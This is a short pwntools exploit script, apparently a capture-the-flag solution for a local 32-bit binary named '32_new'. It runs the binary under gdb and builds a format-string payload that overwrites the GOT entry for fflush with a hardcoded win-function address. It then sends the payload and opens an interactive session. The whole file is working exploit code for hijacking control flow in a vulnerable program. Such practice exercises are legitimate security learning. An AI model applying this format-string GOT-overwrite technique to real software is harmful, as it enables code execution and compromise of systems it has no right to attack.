from pwn import *

elf = ELF('./32_new')
context.binary = elf
# io = process('./32_new')
io = gdb.debug('./32_new', '''
    b main
    b *main+196
    c
''')

FLAG_ADDRESS = 0x0804870b

writes = {
    elf.got['fflush'] : p32(FLAG_ADDRESS)
}

payload = fmtstr_payload(10, writes, numbwritten=0x46)
log.info(f"Payload:\n{hexdump(payload)}")
io.sendline(payload)

io.interactive()
